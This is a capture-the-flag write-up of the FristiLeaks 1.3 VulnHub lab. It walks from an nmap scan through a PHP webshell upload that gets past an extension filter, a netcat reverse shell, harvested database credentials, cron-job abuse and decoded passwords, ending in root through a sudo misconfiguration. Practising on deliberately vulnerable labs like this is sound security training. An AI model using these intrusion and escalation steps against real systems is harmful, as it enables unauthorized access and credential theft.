# FristiLeaks 1.3 | VulnHub
https://www.vulnhub.com/entry/fristileaks-13,133/

### 1. Scan
```bash
kali@kali:~$ sudo nmap -A -T4 -p- 192.168.34.151
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-05 02:46 EST
Nmap scan report for 192.168.34.151
Host is up (0.0013s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.29 ms 192.168.34.151

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.09 seconds
```

### 2. Enumeration
The main homepage for the web server is a single image with the message "Keep calm and drink Fristi". There are three directories disallowed in robots.txt - cola, sisi and beer, but none lead to anything. However they are all related to types of drink, and since the main index page has a message related to fristi, I try navigating to http://192.168.34.151/fristi/ which directs to an admin panel login page for the site.
  
Viewing the source for the login page shows some comments in the site header:
```html
<html>
<head>
<meta name="description" content="super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it.">
<!-- 
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

- by eezeepz
-->
</head>
```
This provides a potential username for the portal. Following this there is a base64 image of a simpsons character, and another thing in base64 which is commented out. Decoding this content in cyberchef gives an image with just the following text: `keKkeKKeKKeKkEkkEk`. Using this together with the username 'eezeepz' gives access to the admin portal.
  
The admin portal is actually just an image upload facility. I test with a basic image and it uploads to the /uploads/ directory. So from here I can attempt to exploit this and get a foothold.

### 3. Get a shell
Firstly I can do the most basic exploit and try to upload a php webshell called image.php. However this is blocked with the message:
```bash
Sorry, is not a valid file. Only allowed are: png,jpg,gif
Sorry, file not uploaded 
```
So I can just change the file extension to .png, then it uploads fine. This means I need to modify my exploit slightly to get the shell to work by changing the filename to image.php.jpg.
Then I upload the file, successfully bypassing the filter. Then go to the image to trigger the code with my listener running
```bash
kali@kali:~$ nc -lvp 9999
Listening on 0.0.0.0 9999
Connection received on 192.168.34.151 48291
Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 12:13:02 up  1:27,  0 users,  load average: 0.00, 0.02, 0.51
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.1$ python -c "import pty; pty.spawn('/bin/bash');"
python -c "import pty; pty.spawn('/bin/bash');"
bash-4.1$
```

### 3. Enumerate from foothold
First thing with the web user, as always, is to check out the web directories. There, there is a note left from another user, presumably an admin.
```bash
bash-4.1$ cat notes.txt
cat notes.txt
hey eezeepz your homedir is a mess, go clean it up, just dont delete
the important stuff.

-jerry
````
Let's quickly check out that user's folder.
```bash
bash-4.1$ ls /home/eezeepz
ls /home/eezeepz
MAKEDEV    chown        hostname  netreport       taskset     weak-modules
cbq        clock        hwclock   netstat         tc          wipefs
cciss_id   consoletype  kbd_mode  new-kernel-pkg  telinit     xfs_repair
cfdisk     cpio         kill      nice            touch       ypdomainname
chcpu      cryptsetup   killall5  nisdomainname   tracepath   zcat
chgrp      ctrlaltdel   kpartx    nologin         tracepath6  zic
chkconfig  cut          nameif    notes.txt       true
chmod      halt         nano      tar             tune2fs
```
Get the mysql username and password...
```bash
bash-4.1$ cat checklogin.php
cat checklogin.php
<?php

ob_start();
$host="localhost"; // Host name
$username="eezeepz"; // Mysql username
$password="4ll3maal12#"; // Mysql password
$db_name="hackmenow"; // Database name
$tbl_name="members"; // Table name
```
Log in and look around:
```bash
bash-4.1$ mysql -u eezeepz -p
mysql -u eezeepz -p
Enter password: 4ll3maal12#

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 396
Server version: 5.1.73 Source distribution

Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| hackmenow          |
+--------------------+
2 rows in set (0.00 sec)

mysql> use hackmenow; show tables;
use hackmenow; show tables;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
+---------------------+
| Tables_in_hackmenow |
+---------------------+
| members             |
+---------------------+
1 row in set (0.00 sec)

mysql> select * from members;
select * from members;
+----+----------+--------------------+
| id | username | password           |
+----+----------+--------------------+
|  1 | eezeepz  | keKkeKKeKKeKkEkkEk |
+----+----------+--------------------+
1 row in set (0.00 sec)
```
Ok, so nothing new there.
OS release information:
```bash
bash-4.1$ cat /etc/*-release 
cat /etc/*-release
CentOS release 6.7 (Final)
CentOS release 6.7 (Final)
CentOS release 6.7 (Final)
```
Now let's move back to checking eezeepz's home folder, and look at the notes file.
```bash
bash-4.1$ cat notes.txt
cat notes.txt
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
```
So if I understand this right, I can run binaries that are in the admin's folder by specifying the full path to them through a file called runthis in tmp. The first thing I want to do is see what's actually in the admin folder and access it all. I can to this by chmodding the directory to completely open permissions.
```bash
bash-4.1$ echo "/home/admin/chmod 777 /home/admin" > /tmp/runthis
echo "/home/admin/chmod 777 /home/admin" > /tmp/runthis
bash-4.1$ cat /tmp/runthis
cat /tmp/runthis
/home/admin/chmod 777 /home/admin
```
After about a minute I see if I can view the admin's directory.
```bash
bash-4.1$ ls /home/admin
ls /home/admin
cat    cronjob.py       cryptpass.py  echo   grep  whoisyourgodnow.txt
chmod  cryptedpass.txt  df            egrep  ps
```
Sure enough I can now see all the files. 

### 4. Escalate privileges
Lets check out the text files.
```bash
cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG

cat cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq

cat cryptpass.py
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```
A string is getting read in from the command line, base64 encoded, reversed, and then rot13'd. No doubt this explains what has happened to the above files. A quick script can be written to reverse this (see decode.py):
```python
import sys, codecs, base64

def decodeString(encoded):
    base64String = codecs.decode(encoded, 'rot-13')[::-1]
    return base64.b64decode(base64String)

print decodeString(sys.argv[1])
```
Then decode the strings like so:
```bash
kali@kali:~/Desktop/osc/friski13$ python decode.py =RFn0AKnlMHMPIzpyuTI0ITG
LetThereBeFristi!

kali@kali:~/Desktop/osc/friski13$ python decode.py mVGZ3O3omkJLmy2pcuTq
thisisalsopw123
```
Then I can use the second password to switch to the admin user.
```bash
bash-4.1$ su - admin
su - admin
Password: thisisalsopw123

[admin@localhost ~]$ 
```

Additionally, the other password is for the fristigod account.
```bash
[admin@localhost home]$ su - fristigod
su - fristigod
Password: LetThereBeFristi!

-bash-4.1$ whoami
whoami
fristigod
```

### 5. Enumerate from user
Unfortunately there is no sudo perms on admin.
```bash
admin@localhost ~]$ sudo -l
[sudo] password for admin: thisisalsopw123

Sorry, user admin may not run sudo on localhost.
```
Fristigod, however...
```bash
-bash-4.1$ sudo -l
sudo -l
[sudo] password for fristigod: LetThereBeFristi!

Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
```
Try running this binary using sudo:
```bash
-bash-4.1$ sudo /var/fristigod/.secret_admin_stuff/doCom
Sorry, user fristigod is not allowed to execute '/var/fristigod/.secret_admin_stuff/doCom' as root on localhost.localdomain.
```
Not really sure what to do at this point, so I go back to normal enumeration. I drop linpeas and run it (see linpeas_out.txt):
```bash
[admin@localhost ~]$ ./linpeas.sh
 Starting linpeas. Caching Writable Folders...which: no fping in (/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/home/admin/bin)


                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    linpeas v2.8.8 by carlospolop
...

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                              
uid=10(uucp) gid=14(uucp) groups=14(uucp)
uid=11(operator) gid=0(root) groups=0(root)
uid=12(games) gid=100(users) groups=100(users)
uid=13(gopher) gid=30(gopher) groups=30(gopher)
uid=14(ftp) gid=50(ftp) groups=50(ftp)
uid=1(bin) gid=1(bin) groups=1(bin),2(daemon[0m),3(sys)
uid=27(mysql) gid=27(mysql) groups=27(mysql)
uid=2(daemon[0m) gid=2(daemon[0m) groups=2(daemon[0m),1(bin),4(adm),7(lp)
uid=3(adm) gid=4(adm) groups=4(adm),3(sys)
uid=48(apache) gid=48(apache) groups=48(apache)
uid=498(vboxadd) gid=1(bin) groups=1(bin)
uid=499(saslauth) gid=76(saslauth) groups=76(saslauth)
uid=4(lp) gid=7(lp) groups=7(lp)
uid=500(eezeepz) gid=500(eezeepz) groups=500(eezeepz)
uid=501(admin) gid=501(admin) groups=501(admin)
uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)
uid=503(fristi) gid=100(users) groups=100(users),502(fristigod)
uid=5(sync) gid=0(root) groups=0(root)
uid=69(vcsa) gid=69(vcsa) groups=69(vcsa)
uid=6(shutdown) gid=0(root) groups=0(root)
uid=74(sshd) gid=74(sshd) groups=74(sshd)
uid=7(halt) gid=0(root) groups=0(root)
uid=89(postfix) gid=89(postfix) groups=89(postfix),12(mail)
uid=8(mail) gid=12(mail) groups=12(mail)
uid=99(nobody) gid=99(nobody) groups=99(nobody)

```
The only thing of interest it gives me (aside from some as-expected outdated OS alerts) is that there is another user without a home folder on the machine - "fristi".

### 6. Escalate to root
I know I can run sudo as another user, using the -u argument, so I try this with fristi.
```bash
-bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
[sudo] password for fristigod: LetThereBeFristi!

Usage: ./program_name terminal_command ...-bash-4.1$
```
Progress. So now I know how the program works. Now I can spawn bash inside the program which should run as root.
```bash
-bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
bash-4.1# whoami
root
```